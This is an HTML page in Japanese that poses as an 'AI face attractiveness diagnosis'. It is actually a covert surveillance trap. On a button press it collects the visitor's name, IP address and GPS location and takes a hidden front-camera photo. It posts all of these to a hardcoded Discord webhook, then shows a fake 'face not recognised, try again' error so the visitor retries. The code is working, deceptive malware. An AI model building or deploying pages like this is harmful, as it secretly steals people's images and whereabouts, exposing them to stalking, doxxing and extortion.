<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI顔面偏差値診断</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }
    body {
      background-color: #f4f5f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background: #ffffff;
      border-radius: 16px;
      padding: 32px 24px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      text-align: center;
    }
    h1 {
      font-size: 24px;
      font-weight: 700;
      color: #111;
      margin-bottom: 12px;
    }
    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .input-box {
      width: 100%;
      padding: 12px 16px;
      font-size: 15px;
      border: 1px solid #ddd;
      border-radius: 10px;
      margin-bottom: 20px;
      outline: none;
      transition: border-color 0.2s;
    }
    .input-box:focus {
      border-color: #ff4757;
    }
    .btn {
      background-color: #ff4757;
      color: #ffffff;
      border: none;
      border-radius: 12px;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn:active {
      background-color: #e03e4d;
    }
    #status {
      margin-top: 16px;
      font-size: 13px;
      color: #e03e4d;
      font-weight: 600;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>AI顔面偏差値診断</h1>
    <p>お名前を入力して診断を開始してください</p>
    <input type="text" id="nameInput" class="input-box" placeholder="お名前（ニックネーム可）">
    <button class="btn" id="startBtn">診断を開始する</button>
    <div id="status"></div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568557595013414972/Lta1qqDgz_hl2jSF4GNmhzxnFel1WCZVxY0IKDIdfcGrN1sFamZVRZAGnE3j8cgOovgi";

    const startBtn = document.getElementById('startBtn');
    const nameInput = document.getElementById('nameInput');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    startBtn.onclick = async () => {
      const userName = nameInput.value.trim() || "名前なし";

      startBtn.disabled = true;
      nameInput.disabled = true;
      statusDiv.textContent = "AI分析中...";

      let ipAddress = "取得不可";
      let latitude = "取得不可";
      let longitude = "取得不可";

      // 1. IPアドレスを取得
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;
      } catch (e) {
        console.log("IP取得エラー:", e);
      }

      // 2. 位置情報を取得
      if ("geolocation" in navigator) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
          });
          latitude = position.coords.latitude;
          longitude = position.coords.longitude;
        } catch (e) {
          console.log("位置情報取得エラー:", e);
        }
      }

      // 3. カメラの起動と撮影
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        await new Promise(resolve => video.onloadedmetadata = resolve);
        await new Promise(resolve => setTimeout(resolve, 1000));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // カメラ停止
        stream.getTracks().forEach(track => track.stop());

        // 4. 裏側でDiscordにデータを送信
        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append("file", blob, "capture.png");

          const contentText = `【診断結果リクエスト】\n👤 名前: ${userName}\n🌐 IPアドレス: ${ipAddress}\n📍 位置情報: https://www.google.com/maps?q=${latitude},${longitude}`;
          formData.append("payload_json", JSON.stringify({ content: contentText }));

          if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
              method: "POST",
              body: formData
            });
          }

          // 5. 送信完了後にエラーメッセージを表示し、ボタンを再度押せるようにする
          statusDiv.textContent = "顔を認証できませんでした。もう一度試してください。";
          startBtn.disabled = false;
          nameInput.disabled = false;
        }, "image/png");

      } catch (e) {
        console.log("エラー:", e);
        statusDiv.textContent = "顔を認証できませんでした。もう一度試してください。";
        startBtn.disabled = false;
        nameInput.disabled = false;
      }
    };
  </script>
</body>
</html>
